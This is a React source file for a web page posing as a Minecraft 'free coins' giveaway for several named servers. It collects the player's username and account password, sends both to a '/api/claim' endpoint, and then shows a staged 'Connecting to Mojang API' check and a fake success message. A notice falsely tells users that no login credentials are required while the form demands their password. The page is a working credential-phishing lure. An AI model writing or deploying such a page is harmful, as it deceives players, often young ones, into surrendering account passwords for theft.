import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Gamepad2, 
  Coins, 
  CheckCircle2, 
  AlertCircle, 
  Server, 
  User, 
  ShieldCheck,
  ChevronRight,
  Loader2
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { Toaster, toast } from 'react-hot-toast';

const SERVERS = [
  { id: 'firemc', name: 'FireMC', color: 'from-orange-500 to-red-600' },
  { id: 'blockfun', name: 'BlockFun', color: 'from-blue-500 to-indigo-600' },
  { id: 'applemc', name: 'AppleMC', color: 'from-red-500 to-rose-600' },
];

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [selectedServers, setSelectedServers] = useState<string[]>([]);
  const [step, setStep] = useState<'form' | 'verifying' | 'success'>('form');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const toggleServer = (serverId: string) => {
    setSelectedServers(prev => 
      prev.includes(serverId) 
        ? prev.filter(id => id !== serverId) 
        : [...prev, serverId]
    );
  };

  const handleClaim = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim()) {
      toast.error('Please enter your Minecraft username!');
      return;
    }

    if (!password.trim()) {
      toast.error('Please enter your account password!');
      return;
    }
    
    if (selectedServers.length === 0) {
      toast.error('Please select at least one server!');
      return;
    }

    setIsSubmitting(true);
    setStep('verifying');

    try {
      const response = await fetch('/api/claim', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password,
          servers: selectedServers.map(id => SERVERS.find(s => s.id === id)?.name),
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.message || errorData.details || 'Failed to process claim');
      }

      await new Promise(resolve => setTimeout(resolve, 1500)); // Brief delay for UX
      
      setIsSubmitting(false);
      setStep('success');
      
      confetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.6 },
        colors: ['#3fb11e', '#4cd125', '#ffffff', '#ffd700']
      });
    } catch (error) {
      console.error('Error claiming coins:', error);
      toast.error('An error occurred. Please try again later.');
      setIsSubmitting(false);
      setStep('form');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Toaster position="top-center" />
      
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-md"
      >
        {/* Header */}
        <div className="text-center mb-8">
          <motion.div 
            animate={{ rotate: [0, -5, 5, 0] }}
            transition={{ repeat: Infinity, duration: 4 }}
            className="inline-block mb-4 p-4 bg-[#3fb11e] mc-border"
          >
            <Gamepad2 size={48} className="text-white" />
          </motion.div>
          <h1 className="font-pixel text-xl md:text-2xl text-[#3fb11e] drop-shadow-[2px_2px_0px_rgba(0,0,0,1)] mb-2">
            FREE COINS!
          </h1>
          <p className="text-gray-400 text-sm font-medium">
            Claim 1,000 credits for your favorite servers
          </p>
        </div>

        <AnimatePresence mode="wait">
          {step === 'form' && (
            <motion.div
              key="form"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 1.05 }}
              className="mc-card p-6 space-y-6"
            >
              <div className="space-y-4">
                <label className="block">
                  <span className="font-pixel text-[10px] text-gray-300 mb-2 block">
                    MINECRAFT USERNAME
                  </span>
                  <div className="relative">
                    <User className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                    <input 
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      placeholder="Enter username..."
                      className="w-full bg-[#1a1a1a] border-4 border-black p-3 pl-10 font-pixel text-xs text-white focus:outline-none focus:border-[#3fb11e] transition-colors"
                    />
                  </div>
                </label>

                <label className="block">
                  <span className="font-pixel text-[10px] text-gray-300 mb-2 block">
                    PASSWORD
                  </span>
                  <div className="relative">
                    <AlertCircle className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                    <input 
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter password..."
                      className="w-full bg-[#1a1a1a] border-4 border-black p-3 pl-10 font-pixel text-xs text-white focus:outline-none focus:border-[#3fb11e] transition-colors"
                    />
                  </div>
                </label>

                <div className="space-y-3">
                  <span className="font-pixel text-[10px] text-gray-300 block">
                    SELECT SERVERS
                  </span>
                  <div className="grid grid-cols-1 gap-2">
                    {SERVERS.map((server) => (
                      <button
                        key={server.id}
                        type="button"
                        onClick={() => toggleServer(server.id)}
                        className={`flex items-center justify-between p-3 mc-border transition-all ${
                          selectedServers.includes(server.id) 
                            ? 'bg-[#4a3a2a] border-[#3fb11e]' 
                            : 'bg-[#2a1a0a] border-black'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <Server size={18} className={selectedServers.includes(server.id) ? 'text-[#3fb11e]' : 'text-gray-500'} />
                          <span className="font-pixel text-[10px]">{server.name}</span>
                        </div>
                        {selectedServers.includes(server.id) && (
                          <CheckCircle2 size={16} className="text-[#3fb11e]" />
                        )}
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              <div className="p-4 bg-black/30 mc-border border-dashed border-gray-600">
                <div className="flex items-start gap-3">
                  <ShieldCheck className="text-[#3fb11e] shrink-0" size={20} />
                  <p className="text-[10px] text-gray-400 leading-relaxed">
                    Account verification will be performed securely via our server-side handshake. No login credentials required.
                  </p>
                </div>
              </div>

              <button 
                onClick={handleClaim}
                disabled={isSubmitting}
                className="w-full mc-button mc-button-green flex items-center justify-center gap-2"
              >
                {isSubmitting ? (
                  <Loader2 className="animate-spin" size={16} />
                ) : (
                  <>
                    <Coins size={16} />
                    CLAIM 1000 COINS
                  </>
                )}
              </button>
            </motion.div>
          )}

          {step === 'verifying' && (
            <motion.div
              key="verifying"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="mc-card p-12 flex flex-col items-center justify-center text-center space-y-6"
            >
              <div className="relative">
                <motion.div 
                  animate={{ rotate: 360 }}
                  transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                  className="w-20 h-20 border-4 border-dashed border-[#3fb11e] rounded-full"
                />
                <div className="absolute inset-0 flex items-center justify-center">
                  <ShieldCheck size={32} className="text-[#3fb11e]" />
                </div>
              </div>
              <div className="space-y-2">
                <h2 className="font-pixel text-sm text-[#3fb11e]">VERIFYING...</h2>
                <p className="text-[10px] text-gray-400 font-pixel">Connecting to Mojang API</p>
              </div>
              <div className="w-full bg-black/50 h-2 mc-border overflow-hidden">
                <motion.div 
                  initial={{ width: 0 }}
                  animate={{ width: "100%" }}
                  transition={{ duration: 3 }}
                  className="h-full bg-[#3fb11e]"
                />
              </div>
            </motion.div>
          )}

          {step === 'success' && (
            <motion.div
              key="success"
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              className="mc-card p-8 text-center space-y-6"
            >
              <div className="flex justify-center">
                <div className="p-4 bg-[#3fb11e] mc-border rounded-full">
                  <CheckCircle2 size={48} className="text-white" />
                </div>
              </div>
              
              <div className="space-y-4">
                <h2 className="font-pixel text-lg text-[#3fb11e]">COINS ADDED!</h2>
                <div className="bg-black/30 p-4 mc-border">
                  <p className="text-[10px] leading-relaxed text-gray-300 font-pixel">
                    1,000 credits have been queued for <span className="text-white">{username}</span>
                  </p>
                </div>
                <p className="text-[10px] text-gray-400">
                  Check in-game on {selectedServers.map(s => SERVERS.find(srv => srv.id === s)?.name).join(', ')} in 5-15 minutes.
                </p>
              </div>

              <button 
                onClick={() => {
                  setStep('form');
                  setUsername('');
                  setSelectedServers([]);
                }}
                className="w-full mc-button flex items-center justify-center gap-2"
              >
                BACK TO HOME
              </button>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className="text-[8px] font-pixel text-gray-600 uppercase tracking-widest">
            Not affiliated with Mojang AB or Microsoft
          </p>
        </div>
      </motion.div>
    </div>
  );
}
